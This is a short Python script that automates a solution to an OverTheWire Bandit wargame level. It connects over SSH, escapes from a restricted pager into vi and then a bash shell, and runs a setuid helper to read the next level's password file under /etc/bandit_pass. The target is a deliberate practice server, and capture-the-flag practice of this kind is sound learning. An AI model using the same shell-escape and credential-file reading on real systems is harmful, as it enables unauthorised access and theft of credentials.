import paramiko
import paramiko.client
from sys import argv
from time import sleep

next_level = argv[0].split('/')[-1].split('\\')[-1][:-3]

username = f"bandit{int(next_level[6:]) - 1}"

with open(f"./passwords/{username}.pass", 'r') as f:
    password = f.read()

client = paramiko.client.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

client.connect(
    hostname="bandit.labs.overthewire.org",
    port=2220,
    username=username,
    password=password
)

shell = client.invoke_shell(height=4)
shell.settimeout(5.0)

shell.send(b'v')
sleep(0.2)
shell.send(b':set shell=/bin/bash\n')
sleep(0.2)
shell.send(b':shell\n')
sleep(0.2)
shell.send(b'./bandit27-do cat /etc/bandit_pass/bandit27\n')
sleep(0.2)
new_password = shell.recv(8192).split(b'\r')[-2].decode()

print(new_password)

shell.close()
client.close()

with open(f"./passwords/{next_level}.pass", 'w') as f:
    f.write(new_password)
